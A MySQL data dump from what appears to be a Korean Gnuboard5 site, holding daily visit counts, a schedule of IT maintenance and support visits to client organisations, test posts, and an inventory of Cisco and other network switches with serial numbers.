INSERT INTO `g5_visit_sum` VALUES ('2022-09-16', '18');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-09', '20');
INSERT INTO `g5_visit_sum` VALUES ('2022-08-24', '21');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-13', '21');
INSERT INTO `g5_visit_sum` VALUES ('2022-08-19', '22');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-12', '22');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-17', '23');
INSERT INTO `g5_visit_sum` VALUES ('2022-08-18', '24');
INSERT INTO `g5_visit_sum` VALUES ('2022-08-31', '24');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-02', '24');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-05', '25');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-09', '25');
INSERT INTO `g5_visit_sum` VALUES ('2022-08-29', '27');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-07', '27');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-10', '28');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-11', '28');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-08', '30');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-06', '31');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-12', '32');
INSERT INTO `g5_visit_sum` VALUES ('2023-05-11', '33');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-04', '33');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-13', '33');
INSERT INTO `g5_visit_sum` VALUES ('2022-08-15', '34');
INSERT INTO `g5_visit_sum` VALUES ('2022-08-16', '35');
INSERT INTO `g5_visit_sum` VALUES ('2022-08-17', '35');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-14', '35');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-03', '36');
INSERT INTO `g5_visit_sum` VALUES ('2023-04-28', '37');
INSERT INTO `g5_visit_sum` VALUES ('2023-05-04', '38');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-19', '39');
INSERT INTO `g5_visit_sum` VALUES ('2023-04-27', '39');
INSERT INTO `g5_visit_sum` VALUES ('2024-04-18', '40');
INSERT INTO `g5_visit_sum` VALUES ('2023-05-03', '41');
INSERT INTO `g5_visit_sum` VALUES ('2023-05-05', '41');
INSERT INTO `g5_visit_sum` VALUES ('2023-05-07', '43');
INSERT INTO `g5_visit_sum` VALUES ('2022-08-23', '45');
INSERT INTO `g5_visit_sum` VALUES ('2023-05-10', '45');
INSERT INTO `g5_visit_sum` VALUES ('2024-04-11', '45');
INSERT INTO `g5_visit_sum` VALUES ('2023-05-06', '46');
INSERT INTO `g5_visit_sum` VALUES ('2023-04-26', '47');
INSERT INTO `g5_visit_sum` VALUES ('2023-05-08', '47');
INSERT INTO `g5_visit_sum` VALUES ('2023-05-02', '49');
INSERT INTO `g5_visit_sum` VALUES ('2024-04-16', '49');
INSERT INTO `g5_visit_sum` VALUES ('2024-04-17', '49');
INSERT INTO `g5_visit_sum` VALUES ('2024-04-13', '51');
INSERT INTO `g5_visit_sum` VALUES ('2023-05-01', '52');
INSERT INTO `g5_visit_sum` VALUES ('2023-05-09', '52');
INSERT INTO `g5_visit_sum` VALUES ('2024-04-14', '56');
INSERT INTO `g5_visit_sum` VALUES ('2024-04-12', '58');
INSERT INTO `g5_visit_sum` VALUES ('2024-04-15', '58');
INSERT INTO `g5_write_day` VALUES ('1', '-1', '', '1', '0', '0', '', '', 'html1', '현우/14:00/정기/주간/후이즈', '<p>후이즈 4월 정기점검</p>', '현우1400정기주간후이즈', '', '', '0', '0', '2', '0', '0', 'admin', '', '최고관리자', 'admin@domain.com', '', '2024-05-01 16:16:39', '0', '2024-05-01 16:16:39', '59.15.128.169', '', '', '2024-04-23 00:00:00', '2024-04-23 23:59:59', '#ffffff', '#1CA261', '1', '0', '', '', '', '');
INSERT INTO `g5_write_day` VALUES ('2', '-2', '', '2', '0', '0', '', '', 'html1', '현우/18:00/기술/OT/한국산업단지공단', '<p>한국산업단지공단 기술지원</p>', '현우1800기술ot한국산업단지공단', '', '', '0', '0', '2', '0', '0', 'admin', '', '최고관리자', 'admin@domain.com', '', '2024-05-01 16:17:30', '0', '2024-05-01 16:17:30', '59.15.128.169', '', '', '2024-04-24 00:00:00', '2024-04-24 23:59:59', '#ffffff', '#3788D8', '1', '0', '', '', '', '');
INSERT INTO `g5_write_day` VALUES ('3', '-3', '', '3', '0', '0', '', '', 'html1', '현우/22:00/기술/OT/에쓰에쓰엔씨', '<p>에쓰에쓰엔씨 기술지원</p>', '현우2200기술ot에쓰에쓰엔씨', '', '', '0', '0', '2', '0', '0', 'admin', '', '최고관리자', 'admin@domain.com', '', '2024-05-01 16:18:01', '0', '2024-05-01 16:18:01', '59.15.128.169', '', '', '2024-04-24 00:00:00', '2024-04-24 23:59:59', '#ffffff', '#3788D8', '1', '0', '', '', '', '');
INSERT INTO `g5_write_day` VALUES ('4', '-4', '', '4', '0', '0', '', '', 'html1', '현우/15:00/기술/주간/남양주도시가스', '<p>남양주도시가스 분기점검<br></p>', '현우1500기술주간남양주도시가스', '', '', '0', '0', '1', '0', '0', 'admin', '', '최고관리자', 'admin@domain.com', '', '2024-05-01 16:21:29', '0', '2024-05-01 16:21:29', '59.15.128.169', '', '', '2024-04-25 00:00:00', '2024-04-25 23:59:59', '#ffffff', '#1CA261', '1', '0', '', '', '', '');
INSERT INTO `g5_write_day` VALUES ('5', '-5', '', '5', '0', '0', '', '', 'html1', '현우/14:00/정기/주간/외교부', '<p>외교부 4월 정기점검</p>', '현우1400정기주간외교부', '', '', '0', '0', '1', '0', '0', 'admin', '', '최고관리자', 'admin@domain.com', '', '2024-05-01 16:22:28', '0', '2024-05-01 16:22:28', '59.15.128.169', '', '', '2024-04-26 00:00:00', '2024-04-26 23:59:59', '#ffffff', '#1CA261', '1', '0', '', '', '', '');
INSERT INTO `g5_write_gallery` VALUES ('1', '-1', '', '1', '0', '0', '', '', 'html1', '테스트 사진', '테스트 사진', '테스트-사진', '', '', '0', '0', '1', '0', '0', 'admin', '', '최고관리자', 'admin@domain.com', '', '2024-05-01 16:35:02', '1', '2024-05-01 16:35:02', '59.15.128.169', '', '', '', '', '', '', '', '', '', '', '', '');
INSERT INTO `g5_write_gallery` VALUES ('2', '-2', '', '2', '0', '0', '', '', 'html1', '테스트 사진', '<p>테스트 사진</p>', '테스트-사진-1', '', '', '0', '0', '1', '0', '0', 'admin', '', '최고관리자', 'admin@domain.com', '', '2024-05-01 16:38:47', '1', '2024-05-01 16:38:47', '59.15.128.169', '', '', '', '', '', '', '', '', '', '', '', '');
INSERT INTO `g5_write_gallery` VALUES ('3', '-3', '', '3', '0', '0', '', '', 'html1', 'test', '<p>test</p>\r\n<p style=\"text-align: center;\"><img src=\"http://34.64.36.149/data/editor/2405/20240513082234_8de7a3fd5ddb8b3b7386cf3a902b8fa2_deeo.jpg\" alt=\"20231103_101507.jpg\" style=\"width: 800px; height: 1067px;\" /></p>', 'test', '', '', '0', '0', '1', '0', '0', 'admin', '', '최고관리자', 'admin@domain.com', '', '2024-05-13 08:22:49', '0', '2024-05-13 08:22:49', '61.32.31.241', '', '', '', '', '', '', '', '', '', '', '', '');
INSERT INTO `g5_write_qr` VALUES ('1', '0', '', '0', '0', '0', '', '', null, 'NI-1001', 'AEN-8024', 'ni-1001', null, null, '0', '0', '2', '0', '0', '', '', '', '', '', '0000-00-00 00:00:00', '0', '', '', '', '', 'Pumpkin', '', 'http://34.64.36.149/theme/Bootstrap5/skin/board/syndgate_car/car_edit.php?bo_table=network&pg=1&wr_id=1', '8X3-826-9670-00511', '', '', '', '', '', '');
INSERT INTO `g5_write_qr` VALUES ('2', '0', '', '0', '0', '0', '', '', null, 'NI-1002', 'PAS-K3200', 'ni-1002', null, null, '0', '0', '1', '0', '0', '', '', '', '', '', '0000-00-00 00:00:00', '0', '', '', '', '', 'Piolink', '', 'http://34.64.36.149/theme/Bootstrap5/skin/board/syndgate_car/car_edit.php?bo_table=network&pg=1&wr_id=2', '1223444556', '', '', '', '', '', '');
INSERT INTO `g5_write_qr` VALUES ('3', '0', '', '0', '0', '0', '', '', null, 'NI-1003', 'WS-C2950-24', 'ni-1003', null, null, '0', '0', '0', '0', '0', '', '', '', '', '', '0000-00-00 00:00:00', '0', '', '', '', '', 'Cisco', '', 'http://34.64.36.149/theme/Bootstrap5/skin/board/syndgate_car/car_edit.php?bo_table=network&pg=1&wr_id=3', 'FOC0814Y2FT', '', '', '', '', '', '');
INSERT INTO `g5_write_qr` VALUES ('4', '0', '', '0', '0', '0', '', '', null, 'NI-1004', 'WS-C3560G-24TS-S', 'ni-1004', null, null, '0', '0', '0', '0', '0', '', '', '', '', '', '0000-00-00 00:00:00', '0', '', '', '', '', 'Cisco', '', 'http://34.64.36.149/theme/Bootstrap5/skin/board/syndgate_car/car_edit.php?bo_table=network&pg=1&wr_id=4', 'FOC1017Y42G', '', '', '', '', '', '');
INSERT INTO `g5_write_qr` VALUES ('5', '0', '', '0', '0', '0', '', '', null, 'NI-1005', 'WS-C2950G-48-EI', 'ni-1005', null, null, '0', '0', '0', '0', '0', '', '', '', '', '', '0000-00-00 00:00:00', '0', '', '', '', '', 'Cisco', '', 'http://34.64.36.149/theme/Bootstrap5/skin/board/syndgate_car/car_edit.php?bo_table=network&pg=1&wr_id=5', 'FOC0919W173', '', '', '', '', '', '');
INSERT INTO `g5_write_qr` VALUES ('6', '0', '', '0', '0', '0', '', '', null, 'NI-1006', 'WS-C2950G-48-EI', 'ni-1006', null, null, '0', '0', '0', '0', '0', '', '', '', '', '', '0000-00-00 00:00:00', '0', '', '', '', '', 'Cisco', '', 'http://34.64.36.149/theme/Bootstrap5/skin/board/syndgate_car/car_edit.php?bo_table=network&pg=1&wr_id=6', 'FOC0748W34F', '', '', '', '', '', '');
INSERT INTO `g5_write_qr` VALUES ('7', '0', '', '0', '0', '0', '', '', null, 'NI-1007', 'WS-C2950G-48-EI', 'ni-1007', null, null, '0', '0', '0', '0', '0', '', '', '', '', '', '0000-00-00 00:00:00', '0', '', '', '', '', 'Cisco', '', 'http://34.64.36.149/theme/Bootstrap5/skin/board/syndgate_car/car_edit.php?bo_table=network&pg=1&wr_id=7', 'FOC1049Y1G9', '', '', '', '', '', '');
INSERT INTO `g5_write_qr` VALUES ('8', '0', '', '0', '0', '0', '', '', null, 'NI-1008', 'WS-C3750G-12S-S', 'ni-1008', null, null, '0', '0', '0', '0', '0', '', '', '', '', '', '0000-00-00 00:00:00', '0', '', '', '', '', 'Cisco', '', 'http://34.64.36.149/theme/Bootstrap5/skin/board/syndgate_car/car_edit.php?bo_table=network&pg=1&wr_id=8', 'FD01236Z16H', '', '', '', '', '', '');
INSERT INTO `g5_write_qr` VALUES ('9', '0', '', '0', '0', '0', '', '', null, 'NI-1009', 'WS-C3750-24TS-S', 'ni-1009', null, null, '0', '0', '0', '0', '0', '', '', '', '', '', '0000-00-00 00:00:00', '0', '', '', '', '', 'Cisco', '', 'http://34.64.36.149/theme/Bootstrap5/skin/board/syndgate_car/car_edit.php?bo_table=network&pg=1&wr_id=9', 'CAT0847K140', '', '', '', '', '', '');
INSERT INTO `g5_write_qr` VALUES ('10', '0', '', '0', '0', '0', '', '', null, 'NI-1010', 'WS-C3750G-12S-S', 'ni-1010', null, null, '0', '0', '0', '0', '0', '', '', '', '', '', '0000-00-00 00:00:00', '0', '', '', '', '', 'Cisco', '', 'http://34.64.36.149/theme/Bootstrap5/skin/board/syndgate_car/car_edit.php?bo_table=network&pg=1&wr_id=10', 'CAT0843R034', '', '', '', '', '', '');
INSERT INTO `g5_write_qr` VALUES ('11', '0', '', '0', '0', '0', '', '', null, 'NI-1011', 'WS-C3750G-12S-S', 'ni-1011', null, null, '0', '0', '0', '0', '0', '', '', '', '', '', '0000-00-00 00:00:00', '0', '', '', '', '', 'Cisco', '', 'http://34.64.36.149/theme/Bootstrap5/skin/board/syndgate_car/car_edit.php?bo_table=network&pg=1&wr_id=11', 'CAT0919R1JX', '', '', '', '', '', '');
INSERT INTO `g5_write_qr` VALUES ('12', '0', '', '0', '0', '0', '', '', null, 'NI-1012', 'WS-C3750G-12S-S', 'ni-1012', null, null, '0', '0', '0', '0', '0', '', '', '', '', '', '0000-00-00 00:00:00', '0', '', '', '', '', 'Cisco', '', 'http://34.64.36.149/theme/Bootstrap5/skin/board/syndgate_car/car_edit.php?bo_table=network&pg=1&wr_id=12', 'FDO1233Z19M', '', '', '', '', '', '');
INSERT INTO `g5_write_qr` VALUES ('13', '0', '', '0', '0', '0', '', '', null, 'NI-1013', 'WS-C3548-XL-EN', 'ni-1013', null, null, '0', '0', '0', '0', '0', '', '', '', '', '', '0000-00-00 00:00:00', '0', '', '', '', '', 'Cisco', '', 'http://34.64.36.149/theme/Bootstrap5/skin/board/syndgate_car/car_edit.php?bo_table=network&pg=1&wr_id=13', 'FAA0434101U', '', '', '', '', '', '');
INSERT INTO `g5_write_qr` VALUES ('14', '0', '', '0', '0', '0', '', '', null, 'NI-1014', 'WS-C2960X-24PS-L', 'ni-1014', null, null, '0', '0', '1', '0', '0', '', '', '', '', '', '0000-00-00 00:00:00', '0', '', '', '', '', 'Cisco', '', 'http://34.64.36.149/theme/Bootstrap5/skin/board/syndgate_car/car_edit.php?bo_table=network&pg=1&wr_id=14', 'FCW1949B3PP', '', '', '', '', '', '');
INSERT INTO `g5_write_test` VALUES ('1', '-1', '', '1', '0', '0', '', '', 'html1', '111', '<p>111</p>', '111', '', '', '0', '0', '2', '0', '0', 'admin', '', '최고관리자', 'admin@domain.com', '', '2024-05-01 16:29:27', '0', '2024-05-01 16:29:27', '59.15.128.169', '', '', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'http://34.64.36.149/bbs/write.php?bo_table=test', '', '', '', '', '', '', '');
